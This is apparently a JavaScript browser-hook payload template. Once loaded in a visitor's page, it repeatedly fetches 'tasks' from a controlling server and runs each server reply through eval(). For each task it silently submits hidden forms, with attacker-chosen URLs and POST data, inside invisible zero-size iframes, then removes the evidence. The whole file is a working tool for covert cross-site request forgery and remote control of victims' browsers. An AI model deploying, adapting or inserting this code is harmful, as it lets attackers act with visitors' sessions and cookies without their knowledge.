(function () {
	var id = "%s";

	function execute_task(task) {
		var finished = false;

		// Report back the request to the server.
		// This is called once the iframe onload or error event triggered.
		// Or when at least 5 seconds elapsed.
		function task_completed () {
			// We report the task completed only once
			if (finished) {
				return
			}

			var xhr = new XMLHttpRequest();
			xhr.open("GET", "/" + id + "/task_done/" + task.id, true);
			xhr.send(null);

			// Cleanup the element to make sure it doesn't clog the page
			frm = document.getElementById(formId);
			frm.parentNode.removeChild(frm);

			setTimeout(function () {
				iframe.parentNode.removeChild(iframe);
			}, 2000);

			finished = true;
		}

		// Creates a target iframe in which the request will be posted.
		// This allows post request without changing page
		var iframeId = Math.random().toString(16).substr(2) + Math.random().toString(16).substr(2);
		var iframe = document.createElement("iframe");
		iframe.style.visibility = "hidden";
		iframe.style.width = "0px";
		iframe.style.height = "0px";
		iframe.name = iframeId;
		iframe.id = iframeId;
		iframe.onload = task_completed;
		iframe.onerror = task_completed;
		document.body.appendChild(iframe);

		// Creates a form which will be posted in the iframe create before.
		var formId = Math.random().toString(16).substr(2) + Math.random().toString(16).substr(2);
		var form = "<form target='" + iframeId + "' id='" + formId + "' action='" + task.url + "' method='" + ((task.post_data) ? "POST" : "GET") + "'>";

		if (task.post_data) {
			var values = task.post_data.split("&");
			for (var i=0; i<values.length; i++) {
				var parts = values[i].split("=");
				form += "<input type='hidden' name='" + unescape(parts[0]) + "' value='" + unescape(parts[1]) + "' />"
			}
		}

		form += "</form>"
		var wrapper = document.createElement("div");
		wrapper.innerHTML = form;
		wrapper.style.visibility = "hidden";
		wrapper.style.width = "0px";
		wrapper.style.height = "0px";
		document.body.appendChild(wrapper);

		// Go ! 
		document.getElementById(formId).submit();

		setTimeout(task_completed, 5000);
	}

	function get_next_task() {
		// TODO: Check compatilibity for older browser.
		var xhr = new XMLHttpRequest();
		xhr.open("GET", "/" + id + "/get_task", true);
		xhr.onreadystatechange = function () {
			if (xhr.readyState == 4 && xhr.status == 200) {

				// When there's no new task, an empty message is sent.
				// We just wait in those cases
				if (xhr.responseText == "") {
					setTimeout(get_next_task, 1000);
					return;
				}

				data = eval("(" + xhr.responseText + ")");
				execute_task(data);

				setTimeout(get_next_task, 10);
			}
		};
		xhr.send(null);
	}

	setTimeout(get_next_task, 100);
}());
